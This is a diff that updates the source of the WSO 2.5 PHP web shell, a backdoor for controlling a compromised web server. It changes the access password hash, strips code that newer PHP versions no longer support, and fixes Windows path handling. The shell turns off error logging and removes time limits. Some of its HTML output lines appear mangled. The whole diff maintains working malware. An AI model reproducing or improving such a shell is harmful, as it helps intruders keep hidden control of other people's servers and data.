@@ -1,4 +1,4 @@
-<?php $auth_pass = "866fd58d77526c1bda8771b5b21d5b11";
+<?php $auth_pass = "5ebe2294ecd0e0f08eab7690d2a6ee69";
 $color = "#df5";
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -14,15 +14,9 @@ if (!empty($_SERVER['HTTP_USER_AGENT'])) {
 @ini_set('log_errors', 0);
 @ini_set('max_execution_time', 0);
 @set_time_limit(0);
-@set_magic_quotes_runtime(0);
+
 @define('WSO_VERSION', '2.5');
-if (false) {
-    function WSOstripslashes($array) {
-        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
-    }
-    $_POST = WSOstripslashes($_POST);
-    $_COOKIE = WSOstripslashes($_COOKIE);
-}
+
 function wsoLogin() {
     die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
 }
@@ -43,8 +37,8 @@ $home_cwd = @getcwd();
 if (isset($_POST['c'])) @chdir($_POST['c']);
 $cwd = @getcwd();
 if ($os == 'win') {
-    $home_cwd = str_replace("\", " / ", $home_cwd);
-	$cwd = str_replace("\", " / ", $cwd);
+    $home_cwd = str_replace("\\", " / ", $home_cwd);
+	$cwd = str_replace("\\", " / ", $cwd);
 }
 if($cwd[strlen($cwd) - 1] != '/')
 	$cwd .= '/';
@@ -202,7 +196,7 @@ pre{font-family:Courier,Monospace;}
         foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
         $drives = "";
         if ($GLOBALS['os'] == 'win') {
-            foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\'))
+            foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\\'))
 			$drives .= ' < ahref = "#"onclick = "g(\'FilesMan\',\''.$drive.':/\')" > ['.$drive.'] < / a > ';
 	}
 	echo ' < tableclass = infocellpadding = 3cellspacing = 0width = 100 % > < tr > < tdwidth = 1 > < span > Uname: < br > User: < br > Php: < br > Hdd: < br > Cwd:
